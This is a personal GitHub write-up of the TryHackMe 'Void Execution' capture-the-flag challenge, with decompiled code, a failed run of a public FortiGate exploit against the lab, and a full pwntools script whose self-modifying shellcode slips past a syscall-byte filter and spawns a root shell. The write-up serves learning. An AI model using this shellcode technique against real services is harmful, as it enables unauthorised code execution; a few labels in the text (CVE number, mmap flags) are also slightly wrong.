<h1 align="center">Void Execution</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/8e9f37ca-b0ce-444d-b596-7429179628a6"><br>
2025, September 13<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>495</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Learn how to bypass restrictions in Linux exploit development</em>.<br>
Access it <a href="https://tryhackme.com/room/hfb1voidexecution">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/650c0463-3dfd-4798-b07d-b6df74ef543a"></p>

<h1>Task 1 . Binary Exploitation  .  Void Execution</h1>
<h3>Void Execution</h3>
<p>Today<br>

Please help us find the vulnerability and craft an exploit for the new Void service.<br>

To start the target machine, click the Start Machine button.</p>

<p>[ Start Machine ]</p>

<p>You can connect to the machine with the following command:<br>

Access the machine on the following IP and Port:<br>
MACHINE_IP 9008<br>
You can download the files there.<br>

This challenge was originally a part of the Hackfinity Battle 2025 CTF Event.</p>

<h6 align="center"><img width="200px" src="https://github.com/user-attachments/assets/43a3b35c-27df-415b-a563-fda11288c09a"><br>TryHackMe</h6>

<p><em>Answer the question below</em></p>
<br>


<h2>nmap</h2>
<p>

- ogs-sever =  Open Grid Services Server/p>

```bash
:~/VoidExecution# nmap -p 9008 xx.xxx.xx.xxx
...
PORT     STATE SERVICE
9008/tcp open  ogs-server
```

<h2>Task File</h2>
<p>

- downloaded the zipped Task File<br>
- extracted it<br>
- identified its types<br>
- launched Ghidra to analyze it</p>

```bash
:~/VoidExecution# ls
ld-linux-x86-64.so.2  libc.so.6  voidexec  voidexec.zip
```

<br>
<br>

```bash
:~/VoidExecution# file ld-linux-x86-64.so.2
ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=cccdd41e22e25f77a8cda3d045c57ffdb01a9793, stripped
```

```bash
:~/VoidExecution# file libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=203de0ae33b53fee1578b117cb4123e85d0534f0, for GNU/Linux 3.2.0, with debug_info, not stripped
```

```bash
:~/VoidExecution# file voidexec
voidexec: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4d5a5e48c62c321224d9826c7f688051ff95e54b, not stripped
```

<br>
<br>
<p><em>main</em> function</p>

<p></p>

- <code>001012eb</code> = function <code>main</code> address<br>001012eb - 0x00100000 = <code>0x12eb</code><br><br><strong>main() offset</strong> at <code>0x12eb</code><br><br>
- identified <code>__s = (code *)mmap((void *)0xc0de0000, 100, 7, 0x22, -1, 0);</code> in function <code>main</code><br><br>
- <code>mmap</code> is mapping<br>address <code>0xc0de0000</code><br>lenght <code>100</code><br>PROT_READ <code>7</code><br>MAP_PRIVATE <code>0x22</code><br>fd <code>-1</code><br>offset <code>0</code><br><br>
- <code>0X00101100</code> = <code>mprotect(__s,100,4);</code><br>address<br>0x00101100 - 0x00100000 = <code>0x1100</code><br><strong>mprotect offset</strong> at <code>0x1100</code></p>

<img width="1294" height="590" alt="image" src="https://github.com/user-attachments/assets/8799e3d0-1eab-4224-9406-1cda5c4e8453" />

<br>
<br>

```bash
undefined8 main(void)

{
  code *__s;
  undefined8 uVar1;
  
  setup();
  __s = (code *)mmap((void *)0xc0de0000,100,7,0x22,-1,0);
  memset(__s,0,100);
  puts("\nSend to void execution: ");
  read(0,__s,100);
  puts("\nvoided!\n");
  uVar1 = forbidden((long)__s);
  if ((char)uVar1 != '\0') {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  mprotect(__s,100,4);
  (*__s)();
  return 0;
}
```

<br>
<br>

<img width="1120" height="519" alt="image" src="https://github.com/user-attachments/assets/2d7ce6b3-4ae2-413c-bf00-84fadac57e56" />

<br>
<br>
<p><em>forbidden</em> function</p>
<p>

- identified that function <code>forbidden</code> returns TRUE if "disallowed instructions" are provided</p>

<img width="1306" height="546" alt="image" src="https://github.com/user-attachments/assets/37287d88-2148-40e1-8bab-e03c5d5b0ead" />

<br>
<br>

```bash
undefined8 forbidden(long param_1)

{
  ulong local_18;
  
  local_18 = 0;
  while( true ) {
    if (0x62 < local_18) {
      return 0;
    }
    if (*(char *)(local_18 + param_1) == '\x0f') break;
    if ((*(char *)(local_18 + param_1) == -0x33) && (*(char *)(param_1 + local_18 + 1) == -0x80)) {
      puts("Forbidden!");
      return 1;
    }
    local_18 = local_18 + 1;
  }
  puts("Forbidden!");
  return 1;
}
```

<br>
<h2>CVE-2022-42465</h2>
<p>

- CVE-2022-42465 : remotely exploitable heap overflow in the SSL VPN component of FortiGate and FortiProxy appliances<br><br>
- cloned https://<code>bishopfox.com/blog/exploit-cve-2022-42475</code><br>
- customized IP and Port<br>
- build a virtual environment<br>
- installed Crypto and pycryptodome<br>
- executed CVE-2022-42475.py ... did not work</p>

<img width="1091" height="173" alt="image" src="https://github.com/user-attachments/assets/e601ebc1-1e97-4cc4-b75d-5efb5ee3640d" />

<br>
<br>

```bash
:~/VoidExecution# python3 -m venv rose
```

```bash
:~/VoidExecution# source rose/bin/activate
```

```bash
(rose) ...:~/VoidExecution# pip3 install Crypto
```

```bash
:~/VoidExecution# pip3 install pycryptodome
```

```bash
(rose) ...:~/VoidExecution# git clone https://github.com/0xhaggis/CVE-2022-42475
```

```bash
(rose) ...:~/VoidExecution# cd CVE-2022-42475
```

```bash
(rose) ...:~/VoidExecution/CVE-2022-42475# ls
CVE-2022-42475.py  exploit_data.json  foxrop.py  README.md  requirements.txt  shellcode.o  shellcode.s
```

```bash
:~/VoidExecution/CVE-2022-42475# ./CVE-2022-42475.py -t xx.xxx.xx.xxx -p 9008  -v

    --[ CVE-2022-42475: FortiGate Remote Pre-auth RCE ]--
    --[ Bishop Fox Cosmos Team X                      ]--
    
[+] Running in validate-only mode. No RCE.
[+] Using cached shellcode. Edit ./CVE-2022-42475.py (look for 'shellcode.s') to force refresh.
[+] Configured for connect-back to 127.0.0.1:443
[>] Testing to see if target is vulnerable (may take 10 seconds)
[>] An unexpected response (36 bytes) was recieved:
----- BEGIN RESPONSE -----

Send to void execution: 

voided!


----- END RESPONSE -----
[!] An error occurred testing 'xx.xxx.xx.xxx:9008' for the vulnerability.
[!] Is this even a FortiGate?
```

<br>
<h2>Script</h2>
<p>by <a href="https://tryhackme.com/room/hfb1voidexecution">here</a>.</p>

```bash
#!/usr/bin/env python3
from pwn import *
# Adjust target IP and port as needed
target = remote("xx.xxx.xxx.xx", 9008)
context.arch = 'amd64'
# These offsets must be obtained from analyzing the local ELF binary
main_offset = 0x12eb         # Replace with actual main offset
mprotect_offset = 0x1100     # Replace with actual mprotect PLT offset
# Base address is 0xc0de0000, length 100 bytes
shellcode = asm(f"""
    /* Compute mprotect address from r13 (holds main at runtime) */
    lea rbx, [r13 - {main_offset} + {mprotect_offset}]
    mov rdi, 0xc0de0000       /* address to change perms */
    mov rsi, 0x64             /* length */
    mov rdx, 0x7              /* PROT_READ | WRITE | EXEC */
    call rbx                  /* mprotect(addr, len, prot) */
    /* Setup execve("/bin/sh", NULL, NULL) */
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b             /* syscall: execve */
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    /* Self-modifying syscall patch */
    inc byte ptr [rip + syscall]
    inc byte ptr [rip + syscall + 1]
    syscall:
    .byte 0x0e, 0x04          /* placeholder for syscall */
""")
print(f"[+] Sending {len(shellcode)} bytes of shellcode...")
target.recvuntil(b"Send to void execution:")
target.sendline(shellcode)
target.interactive()
```

<img width="907" height="464" alt="image" src="https://github.com/user-attachments/assets/57a83c83-93fc-4c14-8191-f3c7afc9eab3" />

<br>
<br>

```bash
(rose) ...:~/VoidExecution# python3 script.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.14.1).
    Update with: $ pip install -U pwntools
[+] Opening connection to xx.xxx.xxx.xx on port 9008: Done
[+] Sending 74 bytes of shellcode...
[*] Switching to interactive mode
 

voided!

$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/home/ctf
$ ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
voidexec
$ cat flag.txt
THM{*************************}
$  
```

<p>1.1. What is the flag?<br>
<code>THM{*************************}</code><br>

<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9e51f6eb-7aa2-4290-9f50-ae86527c4c11"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/0c78662d-640b-4eb3-a7dc-1c2bf3f5dad4"></p>


<h2 align="center">My TryHackMe Journey ・ 2025, September</h2>

<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time<br>Global   |   All Time<br>Brazil   |   Monthly<br>Global   |   Monthly<br>Brazil  | Points   | Rooms<br>Completed     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
| 2025, Sep 13      |Medium 🚩 - <code><strong>Void Execution</strong></code>| 495  | 107ᵗʰ | 5ᵗʰ  |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
| 2025, Sep 12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
| 2025, Sep 12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
| 2025, Sep 11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
| 2025, Sep 10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
| 2025, Sep 9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
| 2025, Sep 9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
| 2025, Sep 9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
| 2025, Sep 8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
| 2025, Sep 8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
| 2025, Sep 7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	    5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,018  |   940    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |
</h6></div><br>

<br>

<p align="center">Global All Time:   110ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/bb0dd33a-7b53-402d-ad45-1bbe804e8570"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/581c63e5-e9af-4ae4-afcd-b83c4d7271ab"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/8274a817-f7d1-4c9a-b410-323008c675a2"><br>
                  Global monthly:   383ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/cc3c0fd5-33c1-40fe-8655-481a5fde5fa4"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/43f9633d-1260-44bc-ac6a-7f5615e4e1c8"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
